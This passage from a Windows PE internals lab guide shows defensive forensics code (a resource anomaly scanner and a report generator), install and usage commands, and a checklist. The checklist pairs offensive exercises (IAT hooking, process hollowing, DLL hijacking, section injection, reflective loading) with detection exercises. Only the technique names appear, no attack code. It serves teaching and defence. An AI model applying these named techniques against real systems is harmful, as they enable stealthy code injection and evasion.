    def __init__(self, pe):
        self.pe = pe
        self.results = []

    @staticmethod
    def entropy(data):
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        n = len(data)
        return -sum((f/n) * math.log2(f/n) for f in freq if f > 0)

    def run(self):
        if not hasattr(self.pe, 'DIRECTORY_ENTRY_RESOURCE'):
            return self.results

        for entry in self.pe.DIRECTORY_ENTRY_RESOURCE.entries:
            type_name = self.RESOURCE_TYPES.get(entry.id, f'TYPE_{entry.id}')
            if not hasattr(entry, 'directory'):
                continue
            for sub in entry.directory.entries:
                if not hasattr(sub, 'directory'):
                    continue
                for leaf in sub.directory.entries:
                    try:
                        rva = leaf.data.struct.OffsetToData
                        size = leaf.data.struct.Size
                        data = self.pe.get_data(rva, min(size, 8192))
                    except Exception:
                        continue

                    ent = self.entropy(data)
                    flags = []

                    if len(data) >= 2 and data[:2] == b'MZ':
                        flags.append('EMBEDDED_PE')
                    if ent > 7.0 and size > 256:
                        flags.append('HIGH_ENTROPY')
                    if size > 1048576:
                        flags.append('LARGE_RESOURCE')
                    if type_name == 'RT_RCDATA' and size > 4096:
                        flags.append('REVIEW_RCDATA')

                    self.results.append({
                        'type': type_name,
                        'id': sub.id if sub.id else str(sub.name),
                        'size': size,
                        'entropy': round(ent, 2),
                        'flags': flags,
                    })

        return self.results
```

#### `peforensics/report.py`

```python
"""Report generation for PEForensics."""
import json
import hashlib
import datetime


class ReportGenerator:
    """Generate analysis reports in text or JSON format."""

    def __init__(self, filepath, raw_data, pe):
        self.filepath = filepath
        self.raw = raw_data
        self.pe = pe
        self.sections = {}

    def add_section(self, name, data):
        self.sections[name] = data

    def render(self, format='text'):
        sha256 = hashlib.sha256(self.raw).hexdigest()

        if format == 'json':
            return json.dumps({
                'file': self.filepath,
                'sha256': sha256,
                'size': len(self.raw),
                'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                'analysis': self.sections,
            }, indent=2, default=str)

        lines = [
            '=' * 65,
            'PEForensics Analysis Report',
            '=' * 65,
            f'File    : {self.filepath}',
            f'SHA-256 : {sha256}',
            f'Size    : {len(self.raw)} bytes',
            f'Date    : {datetime.datetime.utcnow().isoformat()}Z',
            '=' * 65,
        ]

        for section_name, data in self.sections.items():
            lines.append(f'\n--- {section_name.upper()} ---')
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        parts = []
                        for k, v in item.items():
                            parts.append(f'{k}={v}')
                        lines.append('  ' + '  '.join(parts))
                    else:
                        lines.append(f'  {item}')
            elif isinstance(data, dict):
                for k, v in data.items():
                    lines.append(f'  {k}: {v}')

        lines.append('\n' + '=' * 65)
        return '\n'.join(lines)
```

#### `setup.py`

```python
from setuptools import setup, find_packages

setup(
    name='peforensics',
    version='1.0.0',
    packages=find_packages(),
    install_requires=['pefile>=2023.2.7'],
    entry_points={
        'console_scripts': [
            'peforensics=peforensics.cli:main',
        ],
    },
    python_requires='>=3.10',
)
```

#### Installation and usage

```powershell
cd C:\PELab\framework
pip install -e .

# Quick triage
peforensics triage C:\PELab\samples\hello_hardened.exe

# Full analysis
peforensics full C:\PELab\samples\hello_weak.exe

# JSON output for pipeline integration
peforensics audit C:\PELab\samples\hello_hardened.exe --json

# CI mode (exit 1 on failures)
peforensics audit C:\PELab\samples\hello_weak.exe --ci

# Batch scan a directory
peforensics batch C:\PELab\samples\ --output C:\PELab\output\batch_report.txt
```

---

## Lab Validation Checklist

### Part A: Offensive Exercises

- [ ] **Exercise 1:** Manual PE parser produces output matching `dumpbin /headers` for all header fields
- [ ] **Exercise 2:** IAT hook DLL successfully intercepts MessageBoxA, log file contains intercepted arguments, modified message box appears
- [ ] **Exercise 3:** TLS callback binary detects debugger when run under x64dbg, runs clean without debugger, `dumpbin /tls` shows callback array
- [ ] **Exercise 4:** Process hollowing replaces notepad.exe with custom payload, payload MessageBox shows notepad's PID, Task Manager shows notepad.exe process
- [ ] **Exercise 5:** Phantom DLL finder identifies hijackable DLLs, proxy version.dll loads in application directory, log file confirms hijack
- [ ] **Exercise 6:** Code cave finder identifies usable caves, section injector adds new section visible in `dumpbin /headers`, SizeOfImage updated correctly
- [ ] **Exercise 7:** Reflective DLL loads without appearing in PEB module list, PE-sieve detects the implanted region
- [ ] **Exercise 8:** Resource embedder creates PE with encrypted RT_RCDATA, resource extractor decrypts and recovers original payload

### Part B: Defensive Exercises

- [ ] **Exercise 1:** Anomaly engine detects packed binaries (high entropy), RWX sections, injection API triples, missing Authenticode, disabled ASLR/DEP
- [ ] **Exercise 2:** IAT monitor establishes baseline and detects hooks when Exercise 2 DLL is injected
- [ ] **Exercise 3:** YARA rules fire on: packed UPX binary, PE with TLS callbacks, PE with injection APIs, PE with RWX section, PE without Authenticode
- [ ] **Exercise 4:** Hardening audit passes on `/GS /guard:cf /DYNAMICBASE` binary, fails on weakly-compiled binary, CI exit code matches
- [ ] **Exercise 5:** Sigma rules match Sysmon events for hollowing (EID 1+10), reflective loading (EID 7), DLL side-loading (EID 7 from non-System32 path)

### Part C: Framework

- [ ] PEForensics installs via `pip install -e .`
- [ ] `peforensics triage` produces hashes, mitigations, section table, suspicious imports
- [ ] `peforensics audit` produces PASS/FAIL for all mitigation checks
- [ ] `peforensics full` combines all analysis modules
- [ ] `peforensics batch` processes multiple files
- [ ] JSON output valid and parseable
- [ ] `--ci` flag returns exit code 1 on failures

### Cross-Verification

- [ ] Run offensive exercises first, then verify defensive tools detect each attack
- [ ] IAT hook (Exercise A2) → detected by IAT monitor (Exercise B2)
- [ ] Packed binary → detected by anomaly engine (B1) and YARA (B3)
- [ ] Process hollowing (A4) → detected by Sigma rules (B5)
- [ ] Weak binary (no mitigations) → fails hardening audit (B4)
- [ ] All framework modules produce consistent results across text and JSON formats
